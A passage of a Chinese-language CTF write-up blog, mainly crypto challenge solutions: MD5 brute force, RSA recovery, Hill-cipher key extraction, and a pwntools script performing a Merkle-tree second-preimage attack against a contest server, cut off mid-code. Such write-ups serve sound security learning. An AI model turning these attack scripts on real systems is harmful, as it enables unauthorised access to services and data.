<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">filename = &#123;</span><br><span class="line">    <span class="string">&#x27;fi&#x27;</span>: <span class="string">&#x27;first_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fu&#x27;</span>: <span class="string">&#x27;funny_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;la&#x27;</span>: <span class="string">&#x27;last!_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sm&#x27;</span>: <span class="string">&#x27;smart_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cu&#x27;</span>: <span class="string">&#x27;cute__one&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename[i], <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        files[i] = f.read()</span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line">file = files[<span class="string">&#x27;fi&#x27;</span>] + files[<span class="string">&#x27;cu&#x27;</span>] + files[<span class="string">&#x27;sm&#x27;</span>] + files[<span class="string">&#x27;fu&#x27;</span>] + files[<span class="string">&#x27;la&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试到第五个的时候压缩包就能正常的解压了.<br>解压出来一个flag文件, winhex打开发现文件头是jpg的文件头.<br>后缀改成jpg后打开<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-ca5062bb93694bf4a12349419a7457bd.png" alt="图片.png"><br><a name='20'></a></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><blockquote>
<p>最喜欢的密码学! 这次想着要做完密码的, 可惜最后一道题没有做出来. 有趣的加密太难了, 附件只有一段像base的编码, 没什么思路…..<br><a name='21'></a></p>
</blockquote>
<h2 id="碰碰车"><a href="#碰碰车" class="headerlink" title="碰碰车"></a>碰碰车</h2><p>这题感觉就像是proof_of_work…<br>单纯的爆破md5<br>直接上脚本把</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">md5(AGVSCF?TZV?WBGVHC?U)=a8f738??????5ea5??????80865???af</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">STR1 = <span class="string">&#x27;AGVSCF&#x27;</span></span><br><span class="line">STR2 = <span class="string">&#x27;TZV&#x27;</span></span><br><span class="line">STR3 = <span class="string">&#x27;WBGVHC&#x27;</span></span><br><span class="line">STR4 = <span class="string">&#x27;U&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">            STR = STR1 + i + STR2 + j + STR3 + k + STR4</span><br><span class="line">            <span class="keyword">if</span> md5(STR.encode()).hexdigest().startswith(<span class="string">&#x27;a8f738&#x27;</span>):</span><br><span class="line">                print(STR, md5(STR.encode()).hexdigest())</span><br></pre></td></tr></table></figure>
<p>得到结果a8f738a65b715ea54900b180865b20af</p>
<h2 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h2><p>这题也很简单. 运算一下就可以得到N和phi了(太白给了呀<br>然后正常解rsa就行了<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-40a5d5b833e84712955672210c1e96e7.png" alt="图片.png"><br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">pandq = <span class="number">20029167198807103822294848708534176719693827885584335928109682356494141073775700355124993345488062063358756812142730873692437534641839672970148348433433440</span></span><br><span class="line">p2andq2 = <span class="number">208680638196054793779950396947640995086963335225314494211048436767328157403385847902708950876722819363430805183637917486948883719184952031896287718282687710627112461479842558330512185988841693609451411485248346255881435015800175737788918607504412656254312427601603342579907641505150315471704698521905016530338</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">91507581287268678382704102499829526115486105502321675954617344102253738157075000438078155655317661988277710347178352070963528948558320623410799852584156693215831487103699955781123962661928296191496664400110250226880815518273669335738236882265242192523589233915770596106654695524214247405913652100286077779879</span></span><br><span class="line"></span><br><span class="line">n = (pandq ** <span class="number">2</span> - p2andq2) // <span class="number">2</span></span><br><span class="line">phi = n - pandq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出就是flag了<br><a name='22'></a></p>
<h2 id="Go-home"><a href="#Go-home" class="headerlink" title="Go home"></a>Go home</h2><p>这题太迷啦…到现在都还没懂出题人的意思.<br>给出的题目是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0xc3d945bc033ff7dd932ba62d8ef506cb37f5fe8e45abdac07660c7ac2af97d3ce723710384046c1bd967e92b0e03666d7c0bcbd4043b39ee128e5a1c98b5367044a4e72a4868fdc4824e8f0f3074da2857a414c9dfd7bf208d41caefeac144a45a6ca225975b0fced05d85d6e95dc7c2fa303c8a69185b75b8b3fd7f3fe0b9b5</span></span><br><span class="line">p = <span class="number">0xdfe9dd9c9e9987e2fdb230fb346cefa87893afed5d1b4240872ec5b2dfc3b397ecbbf9b54ae6e9b7be150cdc79de1e87d2d674352b857ae4e000000000000000</span></span><br><span class="line">c=<span class="number">0xe1ea04df467b48a7fa372d9374959571a084341041ec71f57e661cedfb517dbf1cc05a305edeb56ce0d2e29a98790a1cd538b31203a8ff7ea79aee1b3ad8629eac19607dce66f9138e3b376a8e915e24d209a23cb8e1a02c6030d840ceb4203</span></span><br></pre></td></tr></table></figure>
<p>一开始拿到题的时候, 确实是没想到这里给的p是p的高位. 知道的话就懂是coppersmith了.<br>所以一开始拿到题是去分解n来着, yafu也确实分出p跟q来了(跟出题人聊了下预期解应该是用coppersmith的<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-7caf65e71a8c4b8b88b15bac25dcfa56.png" alt="图片.png"><br>因为题目也没给公钥e, 所以试着去爆破了一下e, 然而也没爆出结果.(事实上应该是有结果的, 当e=3的时候肯定能得出结果, 但因为过滤是利用字符串ctf{<br>, 所以没有爆出结果来.</p>
<p>于是就卡住了… </p>
<p>因为p很奇怪(没想到这个是p的高位, 导致我觉得c和p调换过来了. 想看看c是否是素数, 扔进 <a target="_blank" rel="noopener" href="http://www.factordb.com/">www.factordb.com</a> 出来了一个意想不到的结果<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-a98bb7722c6c468e8063cf8bdb18334f.png" alt="图片.png"><br>啊这…三次方???<br>于是试着对c开三次方根, 然后转成字符串. 确实得到了在可打印字符范围内的一段字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ardyPq2]2lb]A_1q_p]_p1]qm]dsllw&#123;</span><br></pre></td></tr></table></figure>
<p>ctf,ard ctf,ard ctf,ard<br>对应字母都是位移2位的!<br>扔进工具里位移回来就得到<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6a70c19ef75649d58cdf2a1d9f7f46ee.png" alt="图片.png"><br>(所以最后还是想吐槽一下, 能做出这题真的运气max了.<br><a name='23'></a></p>
<h2 id="block-cipher"><a href="#block-cipher" class="headerlink" title="block cipher"></a>block cipher</h2><p>连上远程查看源码, 发现明明是个hill密码!(名字却叫分组密码(狗头<br>很显然加密就是将pad之后的明文分为每16个字节一组,构成4*4的矩阵,每组都和密钥矩阵做模乘模数为256.</p>
<p>所以只需要构造一个在mod256意义下存在逆矩阵的矩阵, 将这个加密后只需要乘上它的逆矩阵就可以得到密钥矩阵了.再求出密钥矩阵的逆矩阵, 就得对密文进行解密. </p>
<p>对于求模256逆矩阵, 只不过是在原先求逆矩阵的基础上将所有的运算改成模256的意义下进行就行了.</p>
<p>为了节省时间, 在网上找到了一个现成的求模逆矩阵的脚本, 然后再修改了一些细节.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  <span class="comment"># 计算行列式的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">ValueError</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查矩阵格式是否合法以及是否可逆</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_matrix</span>(<span class="params">A, M</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A, <span class="built_in">list</span>)) <span class="keyword">or</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A[<span class="number">0</span>], <span class="built_in">list</span>)) <span class="keyword">or</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A[<span class="number">0</span>][<span class="number">0</span>], <span class="built_in">int</span>)):</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;Invalid matrix format.&#x27;</span>)</span><br><span class="line">    mat = np.array(A)</span><br><span class="line">    D = <span class="built_in">int</span>(np.linalg.det(A)) % M</span><br><span class="line">    <span class="keyword">if</span> gcd(D, M) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;This matrix does not have a modular inversion matrix.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的第一类初等变换：交换矩阵第i行与第j行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">A, i, j</span>):</span></span><br><span class="line">    temp = A[j]</span><br><span class="line">    A[j] = A[i]</span><br><span class="line">    A[i] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的第二类初等变换：将矩阵第i行乘以n</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_n</span>(<span class="params">A, i, n, M</span>):</span></span><br><span class="line">    a = A[i]</span><br><span class="line">    A[i] = [a[x] * n % M <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的第三类初等变换：矩阵第i行减去n倍的j行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">A, i, j, n, M</span>):</span></span><br><span class="line">    a = A[i]</span><br><span class="line">    b = A[j]</span><br><span class="line">    A[i] = [(a[x] - n * b[x]) % M <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到符合要求的第i行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_row</span>(<span class="params">A, i, M</span>):</span></span><br><span class="line">    start = i</span><br><span class="line">    <span class="keyword">while</span> A[start][i] == <span class="number">0</span> <span class="keyword">or</span> gcd(A[start][i], M) &gt; <span class="number">1</span>:</span><br><span class="line">        start = start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回一个整数的模逆元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_rev</span>(<span class="params">num, mod</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">0</span> <span class="keyword">or</span> gcd(num, mod) &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;modular inversion does not exists.&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i * num % mod != <span class="number">1</span>:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disp</span>(<span class="params">mat</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat[i])):</span><br><span class="line">            print(mat[i][j], end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_rev</span>(<span class="params">A, M</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check_matrix(A, M)</span><br><span class="line">        dim = <span class="built_in">len</span>(A)</span><br><span class="line">        <span class="comment"># concatenate with a unit matrix</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                <span class="keyword">if</span> j == i:</span><br><span class="line">                    A[i].append(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    A[i].append(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># transform</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            target_row = find_row(A, i, M)</span><br><span class="line">            swap(A, i, target_row)</span><br><span class="line">            n = mod_rev(A[i][i], M)</span><br><span class="line">            mul_n(A, i, n, M)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                <span class="keyword">if</span> j != i:</span><br><span class="line">                    sub(A, j, i, A[j][i], M)</span><br><span class="line">        <span class="comment"># get result</span></span><br><span class="line">        A_rev = [A[i][dim:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim)]</span><br><span class="line">        <span class="keyword">return</span> A_rev</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = [[<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">43</span>], [<span class="number">42</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">44</span>], [<span class="number">42</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">42</span>], [<span class="number">41</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>]] <span class="comment"># 发送过去的明文的矩阵形式</span></span><br><span class="line">M = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">AINV = matrix_rev(A, M)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A = &#x27;***+**),*)**)***&#x27; 发送过去的明文</span></span><br><span class="line">encA = <span class="string">&#x27;6a9acfbf3dc3bf1265ea2e6a470404c1&#x27;</span>  <span class="comment"># 所返回的密文</span></span><br><span class="line">enc_flag = <span class="string">&#x27;1017b9907716c35955305cbd50481660de262f48955ca48a6f97630d2cc7bb2e4f41b2a0bbce4c43575b234fff6455b0&#x27;</span>  <span class="comment"># 加密之后的flag</span></span><br><span class="line">enc_A = np.array([<span class="built_in">int</span>(encA[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encA), <span class="number">2</span>)]).reshape(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">key = np.matmul(enc_A, AINV) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    手动将key转成k的形式了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">k = [[<span class="number">113</span>, <span class="number">213</span>, <span class="number">10</span>, <span class="number">58</span>],</span><br><span class="line">     [<span class="number">178</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">13</span>],</span><br><span class="line">     [<span class="number">216</span>, <span class="number">204</span>, <span class="number">16</span>, <span class="number">149</span>],</span><br><span class="line">     [<span class="number">189</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">189</span>]]</span><br><span class="line">keyinv = np.array(matrix_rev(k, M))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc_flag), <span class="number">32</span>):</span><br><span class="line">    encflag = enc_flag[i:i + <span class="number">32</span>]</span><br><span class="line">    enc_F = np.array([<span class="built_in">int</span>(encflag[j:j + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encflag), <span class="number">2</span>)]).reshape(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line">    f = np.matmul(keyinv, enc_F) % <span class="number">256</span></span><br><span class="line">    f = f.reshape(<span class="number">16</span>, )</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到flag:ctf{yes-sure-the-plain-is-blocked-right?}<br><a name='24'></a></p>
<h2 id="ant-forest"><a href="#ant-forest" class="headerlink" title="ant forest"></a>ant forest</h2><blockquote>
<p>这题居然只有两个人做真的…可能大家都觉得源码太长了不想看吧?我个人是感觉一点都不难的</p>
</blockquote>
<p>题目的源码不贴了. 大概是在建一个默克尔树(这个默克尔树我也是第一次接触.<br>网上找了张图, 就是从底部的叶子开始, 哈希之后两个两个为一组, 相加再哈希得到新的一层, 直到得到根节点.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-c5a4225fec7e4444819c3167d0a37883.png" alt="图片.png"></p>
<p>而题目的要求就是输入两次叶子节点, 两次的输入不能相同但最后的树根是相同的.仔细想想其实并不难, 第二次生成树的叶子节点是第一次生成的树的其中一层就行了.(似乎是叫第二次原像攻击?</p>
<p>知道原理之后就开始写脚本了, 但是过程不太顺利, 因为python3太多数据类型了(转来转去实在是太鸡儿麻烦了…</p>
<p>所以决定用python2写脚本(确实该用py2写不然太乱了…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dohash</span>(<span class="params">dat</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sha256(sha256(dat).digest()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;139.199.203.26&#x27;</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256(start + END).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;XXXX:&#x27;</span>)</span><br><span class="line">END = re.findall(<span class="string">r&#x27;sha256\(XXXX\+(.*)\)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">r&#x27;== (.*)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">con.sendline(proof(END, SHA))</span><br><span class="line">con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    con.recv()</span><br><span class="line">    con.send(dic[_])</span><br><span class="line">    con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">con.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">a = dohash(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = dohash(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = dohash(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = dohash(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ab = a + b</span><br><span class="line">cd = dohash(c + d).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(ab)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(cd)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> con.recvuntil(<span 